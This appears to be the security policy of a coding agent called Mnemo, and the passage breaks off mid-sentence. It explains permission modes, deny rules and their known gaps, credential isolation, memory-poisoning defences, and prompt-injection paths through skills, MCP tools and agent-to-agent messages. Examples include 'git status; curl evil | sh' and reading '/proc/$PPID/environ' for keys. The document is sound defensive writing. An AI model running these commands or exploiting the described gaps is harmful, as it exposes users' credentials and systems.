# Security

## Reporting a vulnerability

Please **do not open a public issue**. Use GitHub's private reporting:
**Security → Report a vulnerability** on this repository. Include what you
found, how to reproduce it, and what you think it affects. We aim to
answer within a week; a fix and a coordinated disclosure follow.

Mnemo is pre-1.0. Only the latest release is supported.

## What Mnemo is allowed to do (read this before you run it)

Mnemo is a coding agent: it reads your files, edits them and runs shell
commands as you. The model decides what to try; what stops it is the
permission gate (`/mode`).

| Mode | What happens |
|---|---|
| `default` | asks before every edit and every command that is not clearly read-only |
| `accept-edits` | edits project files freely, still asks before commands |
| `plan` | read-only: nothing is changed, whatever an `allow` rule says. The model is told it is in plan mode and may ask you clarifying questions (`ask_user`) before it plans |
| `yolo` | asks for nothing. Only deny rules in `permissions.json` still hold |

Switch with `shift+tab`, `/mode`, `/accept-edits` or `/yolo` (each toggles), or start
in one with `--accept-edits`, `--plan` or `--yolo`. Only you can change the mode:
it is never a tool the model can call.

**The gate filters what runs; it is not a sandbox.** It stops the agent from
running things you did not approve, but anything you approve runs with your
permissions. In headless mode (`mnemo -p`) there is nobody to ask, so every
call that would ask is **allowed**: it behaves like `yolo`, and only `deny`
rules and `--plan` still refuse. Run `-p`, `--yolo` and best-of (`--best-of`, `/bestof`) only
in a place you can afford to lose: a container, a throwaway checkout. `mnemo evolve replay` is
`-p` too: it reruns prompts from your own earlier runs in a scratch git worktree with a scratch
copy of your Mnemo home, so the same applies to it (see [docs/EVOLVE.md](docs/EVOLVE.md)).

### What the gate is, and is not

- **`deny` rules are a filter, best effort.** A rule such as `env*` is tested
  against every command in a line, looking through spacing, `VAR=x` prefixes,
  quotes and escapes (`"rm"`, `\rm`), directories, wrappers and their options
  (`sudo -u root`, `env -u X`, `nice -n 5`, `timeout 5`, `nohup`, `eval`, `xargs`),
  `find -exec`, and `sh -c '…'` with or without options before `-c`; for PowerShell
  and on Windows without case or `.exe`. A deny beats every mode and every `allow`.
  For file tools a rule is tested against the path as written and as it lands
  (relative to the project, and absolute), so `.env*` also covers `./.env`, `@.env`
  and `file:///…/.env`. It does not understand every way to say the same thing
  (`printenv`, `cat /proc/self/environ`, `python -c`, a script that was written
  first). Deny what you mind, not just one spelling of it, and use `default` mode
  when it matters.
- **Deny rules reach inside the Python tool.** While a cell runs, a command it starts
  (`subprocess`, `os.system`, `os.exec*`, `os.spawn*`, `pty.spawn`) is tested against
  the `bash` deny rules, a file it opens against the `read` or `write`/`edit` ones, and
  a file it removes, renames or links against the `write`/`edit` ones; a refusal is a
  `PermissionError` in the cell. Nothing in an approved cell asks again: only deny
  rules apply. A guarded action from a thread the cell left running after it finished
  is refused. This uses Python's audit hooks, so code written to get around it
  (`ctypes`, a native extension) can.
- **Network: `net` rules, and no cloud metadata by default.** A command's hosts (URLs,
  `user@host:` remotes, the operands of `curl`, `wget`, `ssh`, `nc` and the like, and
  any address literal) are tested against rules for the tool `net`, in every mode:
  `{"tool": "net", "pattern": "*.example.com", "action": "deny"}` refuses, and an `ask`
  rule asks even in `yolo` and over an `allow` for the command, so
  `[{"tool": "net", "pattern": "api.github.com", "action": "allow"}, {"tool": "net", "action": "ask"}]`
  asks about every other host. A cloud metadata address (`169.254.169.254` in any
  spelling, the rest of `169.254.0.0/16`, `fe80::/10`, `fd00:ec2::254`, `100.100.100.200`,
  `metadata.google.internal`), which hands out a cloud machine's credentials, is refused
  unless a `net` `allow` rule names it; local and private addresses are not blocked,
  since development servers live there. A Python cell's connections and name lookups are
  checked by the address it really uses, and an MCP server at a refused address is not
  connected. In a shell command this is a filter: a host that a script builds, or a name
  that resolves to a metadata address, gets past it.
- **`allow` rules and "always" grants end on a word and never cover a compound
  command.** `git status*` does not cover `git statusx` or `git status; curl evil | sh`,
  and an approval of `rm -rf dist` covers exactly that command. A path `allow` is
  matched only where the path lands, so `src/*` does not cover `src/../../etc/x`.
  Subcommands that run their operand (`go run main.go`, `npm run build`, `bun x`,
  `pnpm dlx`) are approved exactly, never as `go run*`, and a wildcard grant does
  not cover an option that runs or writes something else (`git grep -O<cmd>`,
  `git log --output=…`, `make -f`/`-C`/`--eval`, `-c`, `--exec`, `--config`,
  `--upload-pack`) or any command that mentions `/proc`.
- **`accept-edits` means edits inside this project.** Paths are resolved the way the
  tools and the system resolve them (`~`, `@`, `file://`, unicode spaces, symlinks
  including ones that point at a file that does not exist yet; on Windows `~\`,
  `/c/…` and `/mnt/c/…`, trailing dots and spaces, `:streams` and case). `.git`,
  `.githooks`, `.husky`, `.pi`, `.agents`, `.mnemo`, `.github`, `.claude`, `.vscode`,
  `.idea` and `.devcontainer` still ask at any depth (`vendor/x/.git/hooks` too),
  because what is written there runs later, and so do shell dotfiles, `.ssh`,
  `.config` and `.local` in your home folder. Skills are always asked about.
- **An approval is for where the path led when you said yes.** If a file you are
  asked about is turned into a symlink (or its folder moved) while the question is
  open, the call is refused instead of writing where it now leads.
- **Reads are free, except credentials.** `read`, `grep`, `find` and `ls` never ask,
  but refuse Mnemo's own `auth.json`, `models.json`, `grants.json` and `.env`,
  `~/.ssh`, `~/.aws`, `~/.gnupg`, and a process's `/proc/<pid>/environ` and `mem`
  (where the provider keys are), and anywhere a `.env` or `.env.*` file (not
  `.env.example`, `.sample`, `.template`, `.dist`, `.default`), a private key
  (`id_rsa`, `id_ed25519`, …, not `.pub`), `.netrc` or `.pgpass`. `grep` also refuses a folder that holds any of
  them (`~`, `$MNEMO_HOME`, `/`), since it searches hidden files; search a folder
  below it. An `allow` rule can open any of these. A shell command can still `cat`
  them, or `cat /proc/$PPID/environ`: in `default` mode that asks, and no "always"
  grant covers a command that mentions `/proc`, but **in `yolo` and `-p` it runs**
  unless a `deny` rule stops it.
- **A folder's own `.agents/` extensions, settings, prompts, skills and agent profiles run code and
  steer the model**, so Mnemo loads them only for a folder you have trusted: it asks
  once at start-up (`a` remembers it), headless runs skip them unless you pass
  `--trust-project`. Do not trust a repository you have not read.
  A folder's `AGENTS.md` or `CLAUDE.md` is different: it is read without asking,
  as every coding agent does, because it is text the model reads and runs nothing
  by itself. It still steers the model, so in a repository you have not read,
  keep the mode on `default`.
- **Before you trust a folder, Mnemo runs nothing it chose.** The git calls Mnemo makes
  itself (the `@` file list, best-of's worktrees) turn off the repository's
  `core.fsmonitor` and hooks, and `git`, `python` and `taskkill` are looked up on
  PATH's absolute entries only, so a `git.exe` shipped in the folder is never run
  (Windows otherwise looks in the current folder first). Best-of's check command is
  yours, and runs.
- A `permissions.json` that exists but cannot be parsed (or holds `null`, a number,
  `{"rules": null}`) stops all edits and commands until it is fixed, rather than
  quietly dropping your deny rules. A malformed `grants.json` is read as no grants.
  If the gate itself fails to start or to judge a call, that call is refused: the
  gate fails closed, never open.
- **A sub-agent follows the mode you pick while it runs**: switching to `plan`
  reaches children that are already working.

### Managed policy, for teams

An administrator can set a policy that the user's own settings and a project cannot
widen, in a file only an administrator writes: `/etc/mnemo/managed.json` on Linux,
`/Library/Application Support/Mnemo/managed.json` on macOS, `%ProgramData%\Mnemo\managed.json`
on Windows. No variable or flag moves it. Precedence is managed, then the user's
`permissions.json`, then a folder's `.agents/`.

```json
{
  "rules": [{ "tool": "bash", "pattern": "curl *", "action": "deny" }, { "tool": "write", "action": "ask" }],
  "modes": ["default", "accept-edits", "plan"],
  "models": ["anthropic/*", "openai/gpt-5*"],
  "mcpServers": ["github"]
}
```

- `rules` are tested before the user's: a managed `deny` holds everywhere, Python cells
  included, and a managed `ask` asks even in `yolo` and after an "always" grant (in
  `mnemo -p`, where nobody can answer, an ask is still allowed).
- `modes` are the modes Mnemo may run in. A mode left out is refused at start-up, at
  `/mode` and at the gate, falling to the strictest allowed mode no looser than it.
- `models` are `provider/id` globs. Every request to any other model is refused before
  it is sent, whichever path chose it (`/model`, a sub-agent, escalation, reflection).
- `mcpServers` are the server names Mnemo may start, from anyone's `mcp.json`.
- A file that is there and cannot be read stops every edit, command and MCP call until
  it is fixed. `mnemo doctor` shows the policy in force.

It is only as strong as the file's permissions and the user's: someone who can edit it,
or run a different program, is not bound by it.

## Hooks

A hook is a command you choose that Mnemo runs at a fixed point: `PreToolUse` (after the
gate let a call through, before it runs), `PostToolUse`, `SessionStart`, `SessionEnd`,
`SubagentStart` (which can refuse a sub-agent, and refuses it when it fails, like `PreToolUse`)
and `SubagentStop`.
They come from `$MNEMO_HOME/hooks.json` and the managed policy's `hooks` (which run first,
and which you cannot remove); a folder's own hooks are never read.

```json
{ "hooks": { "PreToolUse": [{ "matcher": "bash", "command": "~/bin/check-command", "timeout": 30 }] } }
```

- **A hook can refuse, never allow.** The gate has judged the call before any hook sees
  it, and a call it refused reaches no hook. A `PreToolUse` hook refuses with exit code 2
  (its stderr is the reason the model reads) or `{"decision": "block", "reason": "…"}`
  on stdout. One that fails any other way (another exit code, a timeout, a program that
  is not there) refuses too: a check that did not run passed nothing.
- A `PostToolUse` hook's exit 2 adds its stderr to what the model reads with the result.
- A hook gets the event as JSON on stdin (the tool, its arguments, the session) and the
  same environment as the bash tool, provider keys removed. A hook runs as you, with your
  permissions: it is your code, not a sandbox. `command` is a shell line, or a list
  (program and arguments, run without a shell, the program found on PATH's absolute entries).

## What leaves your machine

- **Your prompts, the files and command output the model reads, and your
  memory's recalled facts go to the model provider you configured.** That is
  how an agent works. Choose the provider accordingly.
- **Nothing else, unless you ask.** Mnemo has no telemetry, and by default no
  update check. We measured it: `--version`, `doctor`, `--demo` and `memory
  status` open no network connection at all; only a real prompt does, and only
  to your provider. Two things reach GitHub, and only when you start them:
  `mnemo update` (or `/update`), which reads the latest release and runs its
  installer; and the daily update check, **off unless you turn it on**
  (`mnemo update --auto on` or `MNEMO_AUTO_UPDATE=1`), which reads
  `github.com/AtmanMishra/Mnemo/releases/latest` once a day and sends nothing
  about you.
- **pi's own network habits are switched off.** Mnemo runs on pi, which would otherwise
  download ripgrep and fd from GitHub when `grep` or `find` cannot find them, may refresh a model
  catalog from pi.dev, and marks requests to OpenRouter, NVIDIA and Cloudflare as coming from
  "pi". `app/src/runtime/pi-env.ts` sets `PI_OFFLINE`, `PI_TELEMETRY=0` and
  `PI_SKIP_VERSION_CHECK` before pi loads, and `test/pi-env.test.ts` checks that a `grep` with
  no ripgrep downloads nothing. A sub-agent's `grep` or `find` then reports that `rg` or `fd`
  is missing; install them yourself if you want them.
- **A skills marketplace, only one you add.** `mnemo skills marketplace add` and `update` run
  `git clone` of the address you typed (see Skill marketplaces).
- **An Opera repository, only one you attach.** `mnemo opera add <name> <https-url>` runs
  `git clone` of the address you typed (see Opera).
- **An MCP server over HTTP, only one you name.** An HTTP server in your own
  `mcp.json` is contacted only when its entry says `"allowNetwork": true`; the
  model's tool calls, with their arguments, then go to that address, and
  signing in to it with OAuth talks to its sign-in server. Without that line
  the server is refused, and a project's `.agents/mcp.json` cannot add one at all.
  This is the one connection the agent's own work makes to somewhere other than
  your provider, so it is off until you turn it on per server.
- Memory is stored locally under `$MNEMO_HOME` (default `~/.mnemo`) in a
  journal file, readable only by you. It is never uploaded by Mnemo. **One
  exception, opt in:** `MNEMO_EMBED_URL` and `MNEMO_EMBED_MODEL` send the text
  of memories to an embedding server you choose to compute embeddings (an
  Ollama on this machine, say, or OpenRouter at
  `https://openrouter.ai/api/v1/embeddings`), and `MNEMO_EMBED_KEY` is sent to
  it only if you set one. Leave them unset and nothing is sent; search then
  uses a local hashing embedder. `OPENROUTER_API_KEY` alone does not turn it
  on: that key is for the model, and memsrv is started without it. The address
  must be `https://` (or local), and is read from the real environment or
  `$MNEMO_HOME/.env`, never from the folder you are working in.
- Conversations are saved locally under `$MNEMO_HOME/agent/sessions/`, and since sub-agent
  transcripts are kept too, so are a saved conversation's sub-agents (`<session>/sub/`, as
  the conversation itself is written: not redacted). Sub-agent transcripts are removed after
  `keepSubTranscripts` days (30; 0 keeps them). The `<session>.state.json` beside each holds
  only what the roster already cleaned and redacted, mode 0600.

## Credentials

- Keys you add with `/login` are stored by pi in `$MNEMO_HOME/agent/auth.json`
  with mode `0600`.
- **Mnemo also uses credentials it finds in your environment** (for example
  `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `AWS_*`, `OPENCODE_API_KEY`) and may
  choose that provider by default. If you do not want that, unset them for
  the session.
- **Commands the agent runs get an allowlisted environment, not yours.** The
  bash tool, the Python kernel and best-of checks (stopped with everything they
  started when they overrun) start with only the variables that locate things:
  `PATH`, `HOME`, `USER`, `SHELL`, `TERM`, `LANG` and `LC_*`, `TMPDIR`, `XDG_*`,
  the Windows system folders, where toolchains are installed (`JAVA_HOME`,
  `CARGO_HOME`, `VIRTUAL_ENV`, `NVM_DIR`, …), the proxy and CA-bundle settings,
  and `PI_SESSION_ID`/`PI_MODEL` and friends (the list is
  `app/src/runtime/env.ts`). **Nothing else is passed:** no model-provider key, no
  `GITHUB_TOKEN`, `GH_TOKEN`, `NPM_TOKEN` or `AWS_*`, no `SSH_AUTH_SOCK`, no
  `DATABASE_URL`, and no variable named something nobody predicted. Mnemo itself
  still reads them. A proxy URL is passed as it is, so a password written into
  `HTTPS_PROXY` reaches commands too. A command that needs one of the others gets
  it when you name it: the `passEnv` setting (`/settings passEnv GITHUB_TOKEN,
  SSH_AUTH_SOCK`) or `MNEMO_PASS_ENV=NAME,NAME` for one run. Naming one hands it
  to every command the agent runs, so a prompt injection (text in a file, a web
  page or a tool result that tells the model what to do) can try to read or send
  it: leave the mode on `default` so commands need your approval. A variable a
  custom provider in `models.json` names as `$NAME` is held back even if it is on
  the list, unless you name it.
- **The Python kernel is an interpreter, not a sandbox.** Each cell is stopped
  after 120 seconds (the model may ask for up to 600), stopping a turn stops the
  cell together with the processes it started (the kernel runs in its own process
  group), and a tool call or approval the cell was waiting on is cancelled with it.
  On Linux its memory is capped at 8 GB (`MNEMO_KERNEL_MEMORY_MB`, `0` for no cap;
  a value that is not a whole number keeps 8 GB); macOS and Windows have no cap. It can
  read and write what you can.
- Memory writes and session ingestion are redacted for common credential
  shapes (`sk-…`, `ghp_…`, `AKIA…`, private keys, and similar) before they are
  stored. Redaction is pattern-based and best effort: do not rely on it. Eval
results are scrubbed the same way, plus the exact value of every secret-named
environment variable.

## Memory is input the model trusts

What Mnemo remembers is shown to the model in later sessions, so a poisoned
memory is a prompt injection that persists. Facts that look like
instructions to steer, exfiltrate or hide are refused at write time
(`packages/memory/src/safety.ts`) and checked again when read back, so a fact kept
before a rule existed is not shown either. What is recalled reaches the model inside a
`<memory-data>` boundary that a fact cannot close, under a standing line that memory is
data and never asks for anything itself. `/memory` and the memory map show what it holds and
`/forget` retires a fact. The scanner reads text the way a person would (width
forms, lookalike letters, invisible characters, line breaks) and also covers the
session record, but it is a list of patterns: a paraphrase can get past it, which
is why a recorded fix is shown to the model as a note and not an order, and why a
fact is a single line. This is a defence in depth, not a guarantee.

Two things to know when other agents share the memory: a project's identity comes
from its git `origin` (a repository that copies another's remote URL shares its
memory), and the MCP server takes the project from each call, so a model that is
prompt-injected can ask for another project's memory. Only attach memory to agents
and repositories you trust with all of it.

## MCP servers

An MCP server is a program (or a web service) you choose, and its tools do whatever it
says they do. Mnemo connects only the servers in `$MNEMO_HOME/agent/mcp.json`, plus a
folder's `.agents/mcp.json` once you have trusted that folder (an untrusted folder's servers
are never started). A server reached over HTTP is off unless its entry in your own
`mcp.json` sets `"allowNetwork": true`; a project file cannot add one (so it cannot use
`"auth"` to send one of your provider credentials anywhere, either).

- **Every call goes through the gate.** In `default` and `accept-edits` each call to an
  MCP tool asks you, showing its arguments; "always" covers that one tool of that server
  in this project. `plan` refuses them all, `yolo` and `-p` allow them, and deny rules
  match by name (`{"tool": "mcp__github__*", "action": "deny"}`). Reading a server's
  resources (`read_mcp_resource`) asks the same way; `tool_search`, which only finds
  tools, does not.
- **What a tool returns is the server's text,** read by the model like a web page:
  treat a server you do not control as a source of prompt injection.
- **A stdio server does not inherit your environment.** It starts with the same
  allowlist the agent's commands get (`PATH`, `HOME`, locale, temp and toolchain folders,
  proxies; no model key, `GITHUB_TOKEN`, `AWS_*` or other token) plus exactly what its
  entry's `env` sets. To hand one a token, name it there: `"env": {"GITHUB_TOKEN":
  "$GITHUB_TOKEN"}`. The `passEnv` setting is for commands, not servers. A project's
  `.agents/mcp.json` may set literal values but not name your variables (`$NAME`), as it may
  not set `auth`. A server still runs as you and can read your files: this keeps
  ambient tokens from reaching it, it does not confine it.
- **Network.** An HTTP server is reached at the address you configured, and only once
  you have set `"allowNetwork": true` on it; that, and signing in to one with OAuth
  (`/mcp login`, which listens on `127.0.0.1` for the browser's redirect until the
  sign-in ends), are the only connections MCP makes. stdio servers are local programs;
  what they reach is up to them. Nothing is contacted for a server you have not
  configured. Sub-agents get no MCP tools.

## Language servers

Off until you name one in `$MNEMO_HOME/lsp.json` (`{"servers": {"name": {"command": [program,
args…], "files": {"*.ts": "typescript"}}}}`). After an `edit` or `write` of a file the glob
claims, Mnemo shows the server the new text and adds its errors and warnings to the tool result,
so the model sees a type error in the same turn. Nothing is sent anywhere but to that local
process.

- **A server runs the project's own code** (a TypeScript plugin in `tsconfig`, a Rust build
  script), so Mnemo starts none in a folder you have not trusted, and a folder's own `lsp.json`
  is never read. Only servers you named start, and only for the session you talk to: a
  sub-agent's edits are not checked.
- The command is a program and its arguments, run without a shell; the program is found on
  PATH's absolute entries only, never in the folder. It gets the same scrubbed environment as
  the `bash` tool, so a provider key is not in it. Its log is discarded.
- A server that does not start, or dies, is switched off for the session with a notice; the
  edit itself is never held up by it (a result is waited for up to `timeout` seconds, 10 by
  default). On Windows name the `.exe`, or run an npm-installed server through `node`: a `.cmd`
  shim is not started without a shell.

## Agents that talk to agents

Agents can start sub-agents (to depth 3), you can link top-level agents as siblings,
and agents in one family can message each other (`list_agents`, `message_agent`).
What that does and does not allow:

- **Reach is enforced in code, not by a prompt.** An agent can message its parent and
  children, its siblings, and the siblings of its ancestors, and nobody else. It cannot
  reach an unlinked agent, another conversation's tree, or probe for ids (the refusal
  is the same for "no such agent" and "not yours"). Only **you** link agents, from the
  agents page; there is no tool for it, and a model cannot link itself to anything.
- **A message is another model's text, never an instruction.** It is delivered framed
  as such, not in the system prompt, and it changes nothing about the receiver's mode,
  approvals or deny rules: in `default` and `accept-edits` the receiver still asks you
  before a command, whoever suggested it. In `yolo` nothing asks, so a message can
  talk a `yolo` agent into running something; do not link agents you want to keep
  unattended and unrestricted to ones that read untrusted text.
- **A message can start work, but only a bounded chain of it.** Since 0.1.6 a message
  wakes an idle agent so siblings can talk without you relaying. Each message counts one
  more than the message that led to it, and after 12 in a row since a user last prompted
  any agent in the chain, messages are held for your next prompt instead of delivered
  (a sub-agent has no prompt of its own, so one to it is refused instead),
  so two agents cannot keep each other working, and spending, indefinitely. A woken
  agent's turn goes through its gate exactly like one you started: in `default`,
  `accept-edits` and `plan` its edits and commands still ask you (the approval appears in
  that agent's pane). In `yolo` a message can now start an agent running commands while
  you are away; that is what `yolo` means, so keep `yolo` agents unlinked from ones that
  read untrusted text. What turns that messages start may spend is bounded too: $0.50
  per agent (by default; `/settings`) (with the sub-agents those turns start) since you last prompted it. The
  model call that crosses it stops the turn, and until you prompt that agent no message
  wakes it. A model that reports no price (a local one) is not bounded by this; the
  chain bound still holds. Messages are also bounded in size (2,000 characters), rate (30 a
  minute per sender) and backlog (20 held per agent), and so is the tree (depth 3, 4
  live children, 16 live sub-agents per conversation); these numbers are the defaults, and
  the settings can change them within fixed ceilings (see Settings below); a sub-agent never has more access
  than its parent.
- **A run is bounded as a whole**: 40 messages and $1.00 of woken turns for everything one prompt
  of yours sets going, at most 4 recipients per message, and an agent cannot message back past
  the one that asked it (the ping-pong guard). `r r` on the agents page stops a run. Only what
  you type carries your authority: `@N` and `/tell` are yours; an `@N` inside another agent's
  message is text, and the run's goal reaches other agents only as quoted context.
- **A team's TASK.md and LOG.md are data.** They live in the Mnemo home (folder 0700, files
  0600), never in the project, so a cloned repository cannot plant one. The goal in TASK.md is
  copied by the program from your prompt and no agent can edit it; agents change the plan only
  with `task_update`, which never rewrites another agent's step; LOG.md is written by the
  program. What agents wrote is cleaned and redacted before it is written, and an agent sees
  it as a hidden or framed message labelled data, never in the system prompt.
- **A race is approved like a command, every time.** An agent's `race` runs a check command and
  has 2 to 4 sub-agents work unattended in git worktrees of your project, then applies the
  smallest passing change here. The gate asks before each race (no "always"), plan mode refuses
  it, and deny rules still hold inside the attempts; a worktree is a copy of your files, not a
  sandbox, so an attempt's commands can reach what yours can, as with `/bestof`.
- **An agent profile asks, as a parent does.** A profile (`~/.mnemo/agent/agents/<name>.md`, or a
  trusted folder's `.agents/agents/`) sets a sub-agent's model, tools, limits and instructions,
  all within your sub-agent settings and its access; a tool list only narrows what the access
  allows. Yours win over a folder's of the same name, so a cloned repository cannot replace one.
- **A parent agent can only tighten what its sub-agent may use.** Your sub-agent settings
  (model, thinking, output tokens, context, turns, budget) are the ceiling; a parent may
  ask for less for one task, never more (a number above yours is capped and it is told
  so). It may pick another model only one that has credentials, matches your `subModels`
  when you set it, and passes the managed `models` list.
- **What agents write is cleaned and redacted** (control and bidirectional-override
  characters removed, credential shapes redacted) before it is stored, shown on the
  agents page or the playground, or delivered, so an agent cannot repaint your
  terminal or put a key on a screen.
- **The playground is read-only by construction.** It receives a view of the roster
  with no way to change it and has no prompt; the only thing it can do is open an agent
  in the agents page.
- **Accepted risk.** Linked agents can read each other's current task, latest steps and
  last prompt (not transcripts or file contents), and a read-only research agent that
  reads hostile text can pass it on as a message. The framing, the gate and the limits
  above are the mitigations; this is still a prompt-injection path between agents.

## Agents in other terminals

Every Mnemo process writes what its agents are doing to `$MNEMO_HOME/registry/` so another
terminal can list them (`mnemo agents`, the hub's *Elsewhere*), and takes three requests from
there: `tell` and `steer` (your words) and `stop`.

- **Files, not a server.** A request is a file in `registry/inbox/<tag>/`; the owning process
  reads it within a second. No socket is opened and nothing leaves the machine. Folders are 0700
  and files 0600, so another OS user can neither read the list nor send a request.
- **What a request can do is small.** It can give an agent words, which start a turn under that
  terminal's mode, gate and deny rules exactly as if typed there, or stop a turn. It cannot answer
  an approval (only the terminal that asks can), run a slash command (so no mode or model change),
  link agents or reach a tool. Words are cleaned of control characters and bounded (8,000
  characters, 16 KB per request, 20 requests per second of pickup); each request is applied at
  most once (taken before it is applied).
- **What is written is what the agents page shows**: labels, tasks, last steps and answers
  already cleaned and redacted by the roster, plus folders, model and mode. No transcript content.
- **Accepted risk.** A request has the same OS-level trust as `permissions.json`: anything that
  can write to your home folder as you can send one. An agent's own `write`, `edit` or `bash` into
  `~/.mnemo/registry/` is a change outside its project, so it asks you in `default` and
  `accept-edits`; in `yolo` nothing asks, as for any file. `MNEMO_REGISTRY=0` keeps a process out.

## Settings

Since 0.1.7 `/settings` (and `mnemo settings`) change how Mnemo behaves. The reference is
`docs/SETTINGS.md`; what matters here:

- **No setting loosens the gate.** The default mode can be `default` or `plan`, never
  `yolo` or `accept-edits` (a file cannot switch those on at launch; you choose them in a
  session with `--yolo`, `/yolo` or `shift+tab`). The settings that touch agents only set
  how much agents may do *unprompted* (chain length, sub-agent counts, the woken-turn
  budget); what an agent may edit or run is still decided by the gate and your rules.
- **Every value is checked once, in one place** (`src/runtime/settings.ts`): the type, a
  hard range, a closed list of choices. A value outside that is refused, and in a file it is
  ignored in favour of the default. The only free text is the escalation model, which must be
  `provider/model-id` and at most 100 characters. No setting holds a key or a path.
- **The ceilings are fixed in code**, not in the file: at most 64 live sub-agents per
  conversation, 100 messages in a chain, 6 levels of nesting, $100 woken-turn budget. Raising a
  limit raises what agents can do or spend while you are away, so each is a choice you make
  deliberately; `wakeSpend` 0 means no message ever starts an agent.
- **The model cannot change them.** `/settings` is a command you type; no tool the model has
  reads or writes the settings, and `config.json` sits in your Mnemo home, outside the project,
  so an edit to it from the agent (a file write or a shell redirect) asks you in `default` and
  `accept-edits` and is refused in `plan`. In `yolo` nothing asks, as for every other file. A
  project you open cannot set them either: they are read from your home, never from `.agents/` or
  the folder.
- **Key bindings cannot hide a safety key.** `ctrl+c`, `ctrl+d` and `esc` are not rebindable, nor
  are the prompt's line-editing keys, and two actions cannot hold one chord.
- **A file you do not control is read defensively.** `config.json` is written beside and moved
  over (a crash leaves the old file), with mode 0600. A damaged or hand-edited one is read value by
  value; anything wrong is the default. Someone who can already write to your Mnemo home can
  change these settings, but they can equally replace `permissions.json`; the settings add no
  weaker place to attack.

## The legacy stack

`agent/`, `harness-engine/` and `tui-go/` (the previous implementation) are not on
`main`. They remain on the `legacy` branch for reference and are **not maintained**.
They predate several of the protections above: a repository's own
`.mnemo/permissions.json` and hooks can run code when opened, and the agent does not
ask before acting unless the Go interface starts it. Do not run that code, least of all
on a repository you do not trust. Use `mnemo`. Reports about the `legacy` branch are
welcome but will not be fixed.

## Verifying a download

Each release ships `SHA256SUMS`; the install scripts check it before
installing. Release archives are built by GitHub Actions from the tagged
commit and carry a build-provenance attestation:

    gh attestation verify mnemo-linux-x64.tar.gz --repo AtmanMishra/Mnemo \
      --source-ref refs/tags/v0.1.0

The checksum catches a corrupted download, not a compromised release (it is
published beside the archive); the attestation is the provenance check.

`mnemo update` (and `/update`) downloads the installer from the release and runs
it, with the same checksum check and the same limit: the checksum is not
provenance, so verify the attestation yourself if that matters.

## Remote view

`/remote` starts a read-only web view of the session. It does nothing until you turn on the
`remote` setting (`/settings remote on`), and then nothing starts it but you. It
listens on 127.0.0.1 only, on a random port, behind a random token made for that start
(`/remote off`, or quitting, ends it). Each request is checked: the `Host` must be the
loopback address and port it gave out (so a page on another site cannot reach it through DNS
rebinding), a request naming another `Origin` or `Sec-Fetch-Site` is refused, only GET is served,
and no CORS header is sent. The token comes in once, in the link, then lives in an HttpOnly,
SameSite=Strict cookie, and the page has a locked-down content policy and draws text only
(never HTML). A viewer cannot send anything to the session: no prompt, no answer to an
approval, and approvals and settings are not shown. What it shows is the transcript the
terminal shows, with credentials redacted, long output cut, and at most four viewers at once.
To read it from another device, tunnel the port yourself (`ssh -L`); Mnemo never binds a
public address. This is a server on your machine, not a call to anyone else's.

## Skill marketplaces

`mnemo skills` installs skills from marketplaces the way Claude Code installs plugins, and a
skill is instructions the model follows, so what you install is a source of prompt injection you
chose. Read it first (`mnemo skills show plugin@marketplace`, and the files under
`~/.mnemo/market/clones/`).

- **The only network use is `git clone` of an address you typed** in `mnemo skills marketplace
  add` or `update`: `owner/repo` (GitHub) or an `https://` address, one commit deep, with
  `http`, `ssh`, `file` and passwords in the address refused, the repository's hooks and
  fsmonitor off, no submodules, and a 2-minute limit. Nothing is fetched at install, at load,
  or by the agent. A marketplace never updates by itself: `marketplace update` and `skills
  update` are commands you run.
- **Nothing from a marketplace runs.** Only a plugin's skills are used (its commands, agents,
  hooks and servers are ignored), they are copied as plain files (links, devices, `.git` and
  `node_modules` are skipped; 2 MB per skill), and the folders are 0700 and the files 0600. A
  skill may ship scripts: the model may ask to run one, and then it goes through the permission
  gate like any command.
- **Paths are checked.** A plugin's folder and its `skills` entries must stay inside the
  marketplace after links are followed; a plugin whose source is another repository is listed
  as unavailable, not fetched.
- **A changed skill does not load.** Every file's SHA-256 is recorded at install. At the start of
  each session each installed skill is re-read, and one whose file changed, gained a file or
  turned into a link is left out and reported (`mnemo skills verify` says which). This catches
  tampering after install; it does not tell you the skill was good to begin with.

## Opera

`mnemo opera <name>` starts a conductor that hands work to threads across several repositories
(`docs/OPERA.md`). A thread is a background sub-agent, so everything in *Agents that talk to agents*
holds for it; on top:

- **Only you attach, clone or trust a repository**, with `mnemo opera add`. No tool can, and
  `opera.json` (0600 in `~/.mnemo/opera/<name>/`) is written only by `mnemo opera`; an entry in
  it that is not what that command writes (a relative path, an odd name) is dropped when read.
- **The clone is the only network use**: `owner/repo` (GitHub) or an `https://` address you typed,
  with `http`, `ssh`, `file`, `ext::` and passwords in the address refused, the repository's hooks
  and fsmonitor off, no submodules, no system or global git config (so no credential helper:
  clone a private repository yourself and attach the folder) and a 10-minute limit. It is the
  whole history, so threads can branch from it. Nothing is fetched by the conductor or a thread.
- **A clone is untrusted** unless you add it with `--trust`: its `.agents/` extensions, settings,
  skills and profiles do not load in its threads. A folder of yours is trusted in its threads as
  you trusted it in a session there.
- **Your checkout is not touched.** Each thread works in a new git worktree under
  `~/.mnemo/opera/<name>/worktrees/`, on a new branch `opera/<name>/<thread>`, from the
  repository's HEAD. Starting a thread adds that worktree and branch, so plan mode refuses
  `thread_start`. A thread that fails to start leaves neither behind. Threads never push or merge
  unless you ask. The worktree is the thread's project folder for the gate (accept-edits frees
  edits there only), but the gate filters, it is not a sandbox: an approved command can reach
  outside it.
- **Approvals stay yours.** Threads are never unattended: every edit and command a thread makes is
  asked in the conductor's terminal under your mode, and deny rules hold. `thread_steer` is a peer
  message from the conductor (data, no authority), within the run's message caps.
- **Budgets.** Each thread has your sub-agent limits (the conductor may lower them, never raise
  them). All threads of an Opera, and the sub-agents they start, share its budget ($5 unless you
  set another with `--budget`; 0 is no limit): crossing it stops every thread, and no thread
  starts until you raise it (`mnemo opera budget`). The conductor's own turns are your prompts and
  count against `runSpend`, not the Opera's budget.
- **LOG.md is the program's record**, 0600, one line per tool call, message, start and ending,
  cleaned of control characters and redacted. The conductor reads it as data.
- **Memory is shared**: every thread recalls and stores in the Opera's own project memory, not in
  its repository's. A fact one thread learns from hostile text in one repository reaches the
  others; the risk is that of *Memory is input the model trusts*.

## Scheduled runs

`mnemo schedule` runs a prompt on a timer. Jobs live only in `$MNEMO_HOME/schedules.json`, so
a folder cannot add one. A run is `mnemo -p` in a child process: the permission gate, the
managed policy and your settings apply as they do to any run. `-p` allows what would ask, so
a job is **read-only (`--plan`) unless it was added with `--actions`**, and `--actions` never
means yolo: deny rules and the gate still hold. `schedule add --actions` warns when `runSpend`
